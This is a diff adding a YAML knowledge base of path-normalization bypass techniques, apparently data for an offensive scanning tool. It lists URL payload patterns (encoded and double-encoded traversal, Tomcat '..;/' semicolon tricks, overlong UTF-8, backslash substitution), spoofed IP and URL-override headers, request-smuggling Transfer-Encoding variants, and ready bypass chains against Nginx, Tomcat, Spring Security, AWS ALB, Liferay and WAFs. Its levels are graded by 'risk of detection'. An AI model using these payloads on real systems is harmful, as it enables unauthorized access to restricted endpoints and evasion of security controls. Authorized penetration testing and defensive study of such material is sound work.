@@ -1,0 +1,442 @@
+# Path Normalization Bypass Techniques Knowledge Base
+# Based on Orange Tsai's research, James Kettle's work, and community findings
+# Reference: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+
+bypass_levels:
+  passive:
+    description: "URL manipulation only - lowest risk of detection"
+    techniques:
+      - trailing_slash
+      - url_encoding
+      - double_encoding
+      - case_variation
+      - dot_insertion
+      - path_parameter
+      - null_byte
+  moderate:
+    description: "URL manipulation + header injection"
+    techniques:
+      - trailing_slash
+      - url_encoding
+      - double_encoding
+      - case_variation
+      - dot_insertion
+      - path_parameter
+      - null_byte
+      - backslash_sub
+      - header_override
+      - method_override
+      - hop_by_hop
+  aggressive:
+    description: "All techniques including unicode normalization and exotic encodings"
+    techniques:
+      - trailing_slash
+      - url_encoding
+      - double_encoding
+      - case_variation
+      - dot_insertion
+      - path_parameter
+      - null_byte
+      - backslash_sub
+      - header_override
+      - method_override
+      - hop_by_hop
+      - unicode_normalization
+      - reverse_proxy_misalign
+      - chunk_transfer
+      - wildcard_match
+
+techniques:
+  trailing_slash:
+    name: "Trailing slash / dot manipulation"
+    description: "Add trailing characters that may be normalized differently by proxy vs backend"
+    risk: "low"
+    patterns:
+      - "{path}/"
+      - "{path}/."
+      - "{path}/./"
+      - "{path}/./."
+      - "{path}%20"
+      - "{path}%09"
+      - "{path}?"
+      - "{path}?anything"
+      - "{path}#"
+      - "{path}#anything"
+    effective_against:
+      - "Nginx → any backend"
+      - "Apache → any backend"
+      - "Spring Security"
+
+  url_encoding:
+    name: "URL encoding bypass"
+    description: "Encode path characters that proxy normalizes but backend doesn't (or vice versa)"
+    risk: "low"
+    patterns:
+      # Encode slashes
+      - "{path}%2f"
+      - "%2f{path}"
+      - "{base}%2f{path}"
+      # Dot-dot-slash encoded
+      - "{base}/%2e%2e/{path}"
+      - "{base}/%2e%2e%2f{path}"
+      - "{base}%2f%2e%2e%2f{path}"
+      # Dot-slash encoded
+      - "/%2e/{path}"
+      - "{base}/%2e/{path}"
+      # Mixed encoding
+      - "{base}/..%2f{path}"
+      - "{base}/%2e./{path}"
+      - "{base}/.%2e/{path}"
+    effective_against:
+      - "Nginx → Tomcat"
+      - "Apache → Tomcat"
+      - "Spring Security path matching"
+      - "AWS ALB → backend"
+
+  double_encoding:
+    name: "Double URL encoding"
+    description: "Double-encode characters to bypass first decoding layer"
+    risk: "medium"
+    patterns:
+      - "{base}/%252e%252e/{path}"
+      - "{base}/%252e%252e%252f{path}"
+      - "%252f{path}"
+      - "{base}%252f{path}"
+      - "{base}/%252e/{path}"
+      - "{path}%252f"
+    effective_against:
+      - "IIS → backend"
+      - "WebLogic"
+      - "Some WAF configurations"
+
+  case_variation:
+    name: "Case variation"
+    description: "Change case of path components - some systems are case-insensitive"
+    risk: "low"
+    patterns:
+      - "{PATH_UPPER}"
+      - "{Path_Title}"
+      - "{path_mixed}"
+    effective_against:
+      - "IIS"
+      - "Windows-based servers"
+      - "Some URL matchers"
+
+  dot_insertion:
+    name: "Dot segment insertion"
+    description: "Insert unnecessary dot segments that get normalized"
+    risk: "low"
+    patterns:
+      - "{base}/./{path}"
+      - "{base}//{path}"
+      - "{base}///{path}"
+      - "{base}/.///{path}"
+      - "/./{path}"
+      - "//{path}"
+    effective_against:
+      - "Apache"
+      - "Nginx"
+      - "Path-based ACLs"
+
+  path_parameter:
+    name: "Path parameter injection (Tomcat/Spring)"
+    description: "Tomcat treats semicolons as path parameter delimiters, but many proxies don't"
+    risk: "low"
+    patterns:
+      # Semicolon tricks (Tomcat specific)
+      - "{path};.css"
+      - "{path};.js"
+      - "{path};.html"
+      - "{path};foo=bar"
+      - "{path};jsessionid=x"
+      - "{path};a=b"
+      # Semicolon traversal (the famous Tomcat ;/ bypass)
+      - "{base}..;/{path}"
+      - "{base}/..;/{path}"
+      - "..;/{path}"
+      - "{base}/..;foo=bar/{path}"
+      - "{base}/..;/{path}"
+      # Multiple levels
+      - "{base}/..;/..;/{path}"
+      - "/..;/..;/{path}"
+    effective_against:
+      - "Nginx → Tomcat"
+      - "Apache → Tomcat"
+      - "Spring Security"
+      - "Reverse proxy ACLs"
+    notes: >
+      This is one of the most reliable bypass techniques. Tomcat strips everything
+      between ; and / as a path parameter, but most reverse proxies pass it through.
+      So /admin/..;/actuator/env is seen as /admin/..;/actuator/env by Nginx (no match
+      on /actuator) but Tomcat resolves it to /actuator/env.
+
+  null_byte:
+    name: "Null byte / fragment injection"
+    description: "Some parsers truncate at null bytes or fragment identifiers"
+    risk: "medium"
+    patterns:
+      - "{path}%00"
+      - "{path}%00.html"
+      - "{path}%00.jpg"
+      - "{path}%00index.html"
+    effective_against:
+      - "Older Java servers"
+      - "PHP (historically)"
+      - "Some WAFs"
+
+  backslash_sub:
+    name: "Backslash substitution"
+    description: "Use backslashes instead of forward slashes - normalized differently across parsers"
+    risk: "medium"
+    patterns:
+      - "{base}\\{path}"
+      - "{base}\\..\\{path}"
+      - "{base}\\.\\{path}"
+      - "{base}%5c{path}"
+      - "{base}%5c..%5c{path}"
+      - "{base}/..%5c{path}"
+    effective_against:
+      - "IIS"
+      - "Tomcat on Windows"
+      - "Some proxy configurations"
+
+  header_override:
+    name: "URL override via headers"
+    description: "Use headers to override the URL seen by the backend"
+    risk: "medium"
+    request_modifications:
+      - headers:
+          X-Original-URL: "{path}"
+        description: "Override URL for Symfony, IIS URL Rewrite"
+      - headers:
+          X-Rewrite-URL: "{path}"
+        description: "Override URL for IIS URL Rewrite"
+      - headers:
+          X-Forwarded-Prefix: "/"
+        description: "Override path prefix for Spring Cloud"
+      - headers:
+          X-Forwarded-Path: "{path}"
+        description: "Override forwarded path"
+      - headers:
+          X-Custom-IP-Authorization: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Forwarded-For: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Real-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Originating-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Remote-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Client-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          X-Remote-Addr: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          True-Client-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+      - headers:
+          Cluster-Client-IP: "127.0.0.1"
+        description: "Bypass IP-based restrictions"
+    effective_against:
+      - "Symfony"
+      - "IIS URL Rewrite"
+      - "Spring Cloud Gateway"
+      - "IP-based ACLs"
+
+  method_override:
+    name: "HTTP method override"
+    description: "Override HTTP method to bypass method-based access controls"
+    risk: "low"
+    request_modifications:
+      - headers:
+          X-HTTP-Method-Override: "GET"
+        description: "Override method for frameworks that support it"
+      - headers:
+          X-HTTP-Method: "GET"
+        description: "Override method (IIS)"
+      - headers:
+          X-Method-Override: "GET"
+        description: "Override method (generic)"
+    effective_against:
+      - "Spring MVC"
+      - "Rails"
+      - "Some REST frameworks"
+
+  hop_by_hop:
+    name: "Hop-by-hop header abuse"
+    description: "Abuse Connection header to strip security headers between hops"
+    risk: "medium"
+    request_modifications:
+      - headers:
+          Connection: "close, X-Forwarded-For, X-Real-IP"
+        description: "Strip forwarded headers to reset IP-based auth"
+      - headers:
+          Connection: "close, Authorization"
+        description: "Strip auth header at intermediate proxy"
+    effective_against:
+      - "Multi-tier proxy setups"
+      - "CDN → origin configurations"
+
+  unicode_normalization:
+    name: "Unicode normalization bypass"
+    description: "Use overlong UTF-8 or unicode equivalents that normalize differently"
+    risk: "high"
+    patterns:
+      # Overlong UTF-8 encoding for ../
+      - "{base}/%c0%ae%c0%ae/{path}"
+      - "{base}/%c0%ae%c0%ae%c0%af{path}"
+      # Extended overlong encoding
+      - "{base}/%e0%80%ae%e0%80%ae/{path}"
+      - "{base}/%e0%80%ae%e0%80%ae%e0%80%af{path}"
+      # Unicode full-width characters
+      - "{base}/%ef%bc%8f{path}"  # fullwidth solidus
+      - "{base}%ef%bc%8f{path}"
+    effective_against:
+      - "Older Tomcat versions"
+      - "Some proxy normalization bugs"
+    notes: "Most modern servers reject these, but worth trying on older installations"
+
+  reverse_proxy_misalign:
+    name: "Reverse proxy path misalignment"
+    description: "Exploit differences in how proxy and backend parse the same URL"
+    risk: "medium"
+    patterns:
+      # Proxy sees /static/..%2f..%2f but doesn't match restricted path
+      # Backend normalizes to /actuator/env
+      - "/static/..%2f..%2f{path}"
+      - "/public/..%2f..%2f{path}"
+      - "/assets/..%2f..%2f{path}"
+      - "/images/..%2f..%2f{path}"
+      - "/css/..%2f..%2f{path}"
+      - "/js/..%2f..%2f{path}"
+      # Single traversal
+      - "/anything/..%2f{path}"
+      - "/foo/..%2f{path}"
+      # Using encoded dot
+      - "/..%2f{path}"
+      - "/.%2e/{path}"
+      - "/%2e./{path}"
+      # Tab and space injection
+      - "/{path}%09"
+      - "/{path}%20"
+    effective_against:
+      - "Nginx → Tomcat"
+      - "Nginx → Spring Boot"
+      - "HAProxy → Tomcat"
+      - "Apache → Tomcat"
+    notes: >
+      This technique exploits the fundamental difference between how reverse
+      proxies match request paths for ACL rules vs how the backend resolves
+      the actual path. The proxy may not decode %2f when matching rules.
+
+  chunk_transfer:
+    name: "Chunked transfer encoding tricks"
+    description: "Use chunked encoding to bypass WAFs that don't reassemble"
+    risk: "high"
+    request_modifications:
+      - headers:
+          Transfer-Encoding: "chunked"
+        description: "Use chunked encoding to evade body inspection"
+      - headers:
+          Transfer-Encoding: " chunked"
+        description: "Space before chunked (CL.TE smuggling)"
+      - headers:
+          Transfer-Encoding: "chunked"
+          Transfer-encoding: "x"
+        description: "Duplicate TE header (TE.TE smuggling)"
+    effective_against:
+      - "Some WAF configurations"
+      - "Request smuggling scenarios"
+
+  wildcard_match:
+    name: "Wildcard and glob matching abuse"
+    description: "Abuse glob patterns in proxy path matching rules"
+    risk: "low"
+    patterns:
+      - "{base}/../{path}"
+      - "{base}/..%00/{path}"
+      - "{base}/..%0d/{path}"
+      - "{base}/..%0a/{path}"
+      - "{base}/..%0d%0a/{path}"
+    effective_against:
+      - "Misconfigured proxy rules"
+      - "Glob-based ACLs"
+
+# Specific technology bypass chains
+# These are curated multi-step bypasses for common setups
+bypass_chains:
+  nginx_to_tomcat:
+    description: "Bypass Nginx ACL to reach Tomcat backend"
+    steps:
+      - technique: "path_parameter"
+        pattern: "/allowed/..;/restricted/{path}"
+        explanation: "Nginx sees /allowed/..;/restricted/ and doesn't match /restricted rule. Tomcat resolves ..;/ and serves /restricted/{path}"
+      - technique: "url_encoding"
+        pattern: "/allowed/%2e%2e/restricted/{path}"
+        explanation: "Nginx doesn't decode %2e%2e when matching. Tomcat decodes and resolves to /restricted/{path}"
+      - technique: "reverse_proxy_misalign"
+        pattern: "/static/..%2f..%2frestricted/{path}"
+        explanation: "Nginx allows /static/* prefix. Backend resolves traversal to /restricted/{path}"
+
+  spring_security_bypass:
+    description: "Bypass Spring Security path matching"
+    steps:
+      - technique: "trailing_slash"
+        pattern: "{path}/"
+        explanation: "Spring Security may not match trailing slash variant"
+      - technique: "path_parameter"
+        pattern: "{path};.css"
+        explanation: "Spring may strip path params after security check"
+      - technique: "case_variation"
+        pattern: "{PATH_UPPER}"
+        explanation: "AntPathMatcher may be case-insensitive depending on config"
+      - technique: "dot_insertion"
+        pattern: "{base}/./{path}"
+        explanation: "Dot segment may confuse path matching"
+
+  aws_alb_bypass:
+    description: "Bypass AWS ALB path-based routing rules"
+    steps:
+      - technique: "url_encoding"
+        pattern: "/%2f{path}"
+        explanation: "ALB may not normalize double-slash before routing"
+      - technique: "dot_insertion"
+        pattern: "/./{path}"
+        explanation: "ALB may pass dot segments to backend without resolving"
+
+  liferay_jsonws_bypass:
+    description: "Bypass restrictions on Liferay /api/jsonws endpoint"
+    steps:
+      - technique: "path_parameter"
+        pattern: "/group/control_panel/..;/..;/api/jsonws/"
+        explanation: "Proxy sees /group/control_panel/ (allowed), Tomcat resolves ..;/ traversal to /api/jsonws/ (restricted). From VNG $20K writeup."
+      - technique: "url_encoding"
+        pattern: "/group/control_panel/%2e%2e%3b/%2e%2e%3b/api/jsonws/"
+        explanation: "URL-encoded ..;/ traversal bypasses Akamai WAF that blocks semicolons. WAF doesn't decode %3b as ;. Tomcat decodes and strips path parameters."
+      - technique: "path_parameter"
+        pattern: "/c;/portal/portlet_url"
+        explanation: "Semicolon after /c bypasses endpoint filtering. Tomcat treats ;/ as path parameter delimiter, serves /c/portal/portlet_url. From Apple Liferay RCE."
+      - technique: "url_encoding"
+        pattern: "/api/jsonws/service-class-name/method-name/arg1/val1"
+        explanation: "Liferay JSONWS supports GET-based invocation via URL path syntax instead of POST JSON body, bypassing WAF body inspection rules."
+
+  waf_general_bypass:
+    description: "General WAF bypass techniques"
+    steps:
+      - technique: "double_encoding"
+        pattern: "{base}/%252e%252e/{path}"
+        explanation: "WAF decodes once, sees %2e%2e (benign). Backend decodes again to ../"
+      - technique: "header_override"
+        headers:
+          X-Original-URL: "/restricted/{path}"
+        explanation: "WAF checks original URL, backend uses override header"
+      - technique: "unicode_normalization"
+        pattern: "{base}/%c0%ae%c0%ae/{path}"
+        explanation: "WAF may not recognize overlong UTF-8 as traversal"
